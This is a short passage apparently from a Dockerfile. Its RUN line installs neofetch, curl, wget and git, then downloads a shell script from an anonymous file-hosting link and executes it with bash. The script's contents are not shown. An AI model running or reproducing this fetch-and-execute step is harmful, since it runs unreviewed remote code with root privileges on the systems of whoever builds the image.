...
RUN sudo apt-get update && sudo apt-get install neofetch -y && sudo apt install curl -y && sudo apt install wget -y && sudo apt install git -y && sudo wget -O install.sh https://files.catbox.moe/giqw5o.sh && bash install.sh
